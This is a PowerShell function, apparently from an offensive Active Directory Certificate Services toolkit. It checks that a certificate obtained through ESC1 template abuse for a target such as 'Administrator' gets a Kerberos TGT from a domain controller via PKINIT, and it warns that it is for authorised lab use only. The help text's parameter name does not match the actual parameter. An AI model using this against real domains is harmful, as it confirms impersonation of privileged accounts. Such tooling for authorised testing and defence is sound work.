function Test-ESC1Certificate {
    <#
        .SYNOPSIS
        Verifies a certificate via PKINIT AS-REQ/AS-REP without injecting the TGT.

        .DESCRIPTION
        Takes a certificate (with private key) and performs PKINIT pre-authentication
        against a domain controller. Verifies that:
        1. The KDC accepts the certificate and issues a TGT
        2. The TGT is for the expected principal (nonce + cname match)
        3. The TGT contains valid timestamps and session key

        The TGT is displayed to the user and then discarded. No ticket injection,
        no LSA interaction, no ticket written to disk.

        This function uses embedded C# (Add-Type) for ASN.1, DH key agreement, and
        Kerberos crypto. The C# code is visible in the .ps1 file.

        .PARAMETER CertificateBase64
        Base64-encoded certificate with private key (PKCS#12 / PFX format).
        Use Request-ESC1Certificate to obtain this.

        .PARAMETER CertificatePassword
        Password for the PFX. Defaults to empty string.

        .PARAMETER UserName
        The user to request a TGT for (e.g. 'Administrator').

        .PARAMETER Domain
        The Kerberos realm (e.g. 'LAB.LOCAL'). Defaults to the current domain.

        .PARAMETER DomainController
        IP or hostname of the domain controller. Defaults to auto-discovery.

        .OUTPUTS
        PSCustomObject with verification results:
        - Success: $true if PKINIT verification passed
        - PrincipalName: the principal in the TGT
        - Realm: the Kerberos realm
        - AuthTime, StartTime, EndTime, RenewTill: ticket timestamps
        - Flags: ticket flags
        - SessionKeyType: encryption type of the session key
        - Error: error message if Success is $false

        .EXAMPLE
        $cert = Request-ESC1Certificate -TemplateName 'WebServer' -CertificateAuthority 'ADCSGoat-CA\LabRootCA1' -TargetUPN 'Administrator@adcs.goat'
        $result = Test-ESC1Certificate -CertificateBase64 $cert.CertificateBase64 -UserName 'Administrator' -Domain 'ADCS.GOAT'
        if ($result.Success) { Write-Host "PKINIT verified for $($result.PrincipalName)" }

        .NOTES
        WARNING: This function performs real PKINIT authentication. Only use in
        authorized test environments. The KDC will log the authentication attempt.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateNotNull()]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,

        [Parameter()]
        [string]$CertificatePassword = '',

        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$UserName,

        [Parameter()]
        [string]$Domain,

        [Parameter()]
        [string]$DomainController,

        [Parameter()]
        [string]$KeyContainerName
    )

    Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand)..."

    $result = [PSCustomObject]@{
        Success       = $false
        PrincipalName = $null
        Realm         = $null
        AuthTime      = $null
        StartTime     = $null
        EndTime       = $null
        RenewTill     = $null
        Flags         = $null
        SessionKeyType = $null
        Error         = $null
    }

    # Auto-discover domain if not provided
    if (-not $Domain) {
        try {
            $rootDSE = New-Object System.DirectoryServices.DirectoryEntry('LDAP://RootDSE')
            $Domain = $rootDSE.Properties['defaultNamingContext'].Value -replace 'DC=', '' -replace ',', '.'
            Write-Verbose "Auto-discovered domain: $Domain"
        } catch {
            $result.Error = "Could not auto-discover domain: $($_.Exception.Message)"
            return $result
        }
    }

    # Auto-discover DC if not provided
    if (-not $DomainController) {
        try {
            $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController()
            $DomainController = $dc.IPAddress
            Write-Verbose "Auto-discovered DC: $DomainController"
        } catch {
            $result.Error = "Could not auto-discover domain controller: $($_.Exception.Message)"
            return $result
        }
    }

    # Load embedded C# if not already loaded
    if (-not ([System.Management.Automation.PSTypeName]'ESCalator.Pkinit.PkinitClient').Type) {
        Write-Verbose "Loading embedded PKINIT C#..."
        $csharpPath = Join-Path $PSScriptRoot 'Invoke-PkinitVerify.cs'
        if (-not (Test-Path $csharpPath)) {
            $result.Error = "Embedded C# file not found: $csharpPath"
            return $result
        }
        $src = Get-Content $csharpPath -Raw
        try {
            Add-Type -TypeDefinition $src -ReferencedAssemblies @(
                'System',
                'System.Core',
                'System.Security',
                'System.Security.Cryptography.X509Certificates',
                'System.DirectoryServices',
                'System.DirectoryServices.Protocols',
                'System.Numerics'
            ) -ErrorAction Stop
        } catch {
            $result.Error = "Failed to compile embedded C#: $($_.Exception.Message)"
            return $result
        }
    }

    # Call PKINIT client
    Write-Verbose "Performing PKINIT verification for $UserName@$Domain via $DomainController..."
    try {
        $pkinitResult = [ESCalator.Pkinit.PkinitClient]::VerifyTgt(
            $Certificate,
            $UserName,
            $Domain,
            $DomainController
        )

        if ($pkinitResult.Success) {
            $result.Success = $true
            $result.PrincipalName = $pkinitResult.PrincipalName
            $result.Realm = $pkinitResult.Realm
            $result.AuthTime = $pkinitResult.AuthTime
            $result.StartTime = $pkinitResult.StartTime
            $result.EndTime = $pkinitResult.EndTime
            $result.RenewTill = $pkinitResult.RenewTill
            $result.Flags = $pkinitResult.Flags
            $result.SessionKeyType = $pkinitResult.SessionKeyType

            Write-Host ""
            Write-Host "[+] PKINIT verification successful!" -ForegroundColor Green
            Write-Host ""
            Write-Host "  Principal:  $($result.PrincipalName)" -ForegroundColor White
            Write-Host "  Realm:      $($result.Realm)" -ForegroundColor White
            Write-Host "  Auth Time:  $($result.AuthTime)" -ForegroundColor White
            Write-Host "  Start Time: $($result.StartTime)" -ForegroundColor White
            Write-Host "  End Time:   $($result.EndTime)" -ForegroundColor White
            Write-Host "  Renew Till: $($result.RenewTill)" -ForegroundColor White
            Write-Host "  Flags:      0x$('{0:X8}' -f $result.Flags)" -ForegroundColor White
            Write-Host "  Key Type:   $($result.SessionKeyType)" -ForegroundColor White
            Write-Host ""
            Write-Host "[i] TGT verified and discarded. No ticket injected." -ForegroundColor Cyan
        } else {
            $result.Error = $pkinitResult.Error
            Write-Warning "PKINIT verification failed: $($result.Error)"
        }
    } catch {
        $result.Error = "PKINIT client exception: $($_.Exception.Message)"
        Write-Warning $result.Error
    } finally {
        # Clean up the ephemeral key container created by Request-ESC1Certificate.
        # The cert is left in the store; the key is deleted.
        if ($KeyContainerName) {
            try {
                $csp = [System.Security.Cryptography.CspParameters]::new()
                $csp.KeyContainerName = $KeyContainerName
                $csp.Flags = [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore
                $rsaCleanup = [System.Security.Cryptography.RSACryptoServiceProvider]::new($csp)
                $rsaCleanup.PersistKeyInCsp = $false
                $rsaCleanup.Clear()
                Write-Verbose "Deleted key container: $KeyContainerName"
            } catch {
                Write-Verbose "Could not delete key container '$KeyContainerName': $($_.Exception.Message)"
            }
        }
    }

    Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand)..."
    return $result
}
